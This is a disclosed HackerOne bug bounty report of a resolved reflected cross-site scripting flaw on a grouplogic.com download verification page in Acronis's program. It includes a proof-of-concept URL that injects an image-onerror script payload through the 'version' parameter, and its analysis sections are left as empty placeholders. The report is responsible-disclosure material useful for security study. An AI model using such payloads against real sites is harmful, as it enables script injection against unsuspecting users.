---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '859395'
original_report_id: '859395'
title: Reflected XSS on http://www.grouplogic.com/files/glidownload/verify.asp
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: acronis
created_at: '2020-04-25T21:20:25.180Z'
disclosed_at: '2021-04-13T13:23:29.831Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 80
asset_identifier: Other Acronis Domains
asset_type: OTHER
max_severity: medium
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS on http://www.grouplogic.com/files/glidownload/verify.asp

## Metadata

- HackerOne Report ID: 859395
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: acronis
- Disclosed At: 2021-04-13T13:23:29.831Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello there,
I hope you are well!

As I see, Group Logic is your subsidary and www.grouplogic.com is a managed website by Acronis.
{F803772}

I found a reflected xss on http://www.grouplogic.com/
PoC: http://www.grouplogic.com/files/glidownload/verify.asp?version=AC12%27%3E%3Cimg%20src=v%20onerror=alert(document.domain)%3E

## Impact

Reflected XSS

Best Regards,
@mygf

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
